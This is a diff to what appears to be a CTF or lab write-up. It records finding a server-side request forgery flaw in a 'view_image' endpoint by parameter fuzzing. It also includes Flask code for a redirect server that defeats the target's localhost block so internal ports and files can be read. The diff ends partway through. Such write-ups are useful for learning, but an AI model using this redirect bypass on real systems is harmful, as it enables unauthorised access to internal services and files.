@@ -159,8 +159,10 @@
 
 - FFUF's directory scan
 
-- I tried the `view_image` route and got a 500 error when I tried the `GET` method.I tried the `POST` method and discovered it required the `image_url` parameter.Then,I tried to load
-a url to see the output but it just reflects it back.
+![image](https://github.com/user-attachments/assets/0c475fb2-a5af-4129-a7c0-2453d2740f36)
+
+
+- I tried the `view_image` route and got a 500 error when I tried the `GET` method.I tried the `POST` method and discovered it required the `image_url` parameter.Then,I tried to load a url to see the output but it just reflects it back.
 
 ![image](https://github.com/user-attachments/assets/22d97295-dc4e-4ffe-80ab-c1711b24da43)
 
@@ -168,7 +170,39 @@ a url to see the output but it just reflects it back.
 
 ![image](https://github.com/user-attachments/assets/5742d7bf-fa9f-41f8-bcab-52313e411f68)
 
-- Then,I fuzzed for params with `Burp Intruder`.I used the wordlist `common.txt` to fuzz.Suprisingly,I got a 500 error from the param `www`.
+- Then,I fuzzed for params with `Burp Intruder`.I used the wordlist `common.txt` to fuzz.I got the param `www` which successfully loaded the url of the target.The endpoint is vulnerable to server side request forgery.
+
+![image](https://github.com/user-attachments/assets/ff84ede2-75e2-4af1-b4a7-50307d8d9c03)
+
+- I tried to load localhost and see if I can fuzz for internal ports but I got the `403` error.
+
+![image](https://github.com/user-attachments/assets/a731fa11-a793-4eb9-8f0a-9cb9159ea031)
+
+- I bypassed the 403 error by setting up a site which redirects to the localhost url.I exploited this by setting up a Flask server with the code below.The index page takes in 2 params which is the `port` and `file`.The port serves as the internal port we want to load,while the `file` param signifies the file that we want to read.
+
+```python3
+#! /usr/bin/env python3
+from flask import Flask, redirect,request
+from urllib.parse import quote
+app = Flask(__name__)    
+
+@app.route('/',methods=['GET'])    
+def root():
+    port = request.args.get("port")
+    file = request.args.get("file")
+    if file != None:
+        url =  f"http://127.0.0.1:{port}/{file}"
+    else:
+        url = f"http://127.0.0.1:{port}/"
+    return redirect(url, code=301)
+    
+if __name__ == "__main__":
+    app.run(host="<ip>", port=8080)
+```
+
+-
+
+
 
 
 
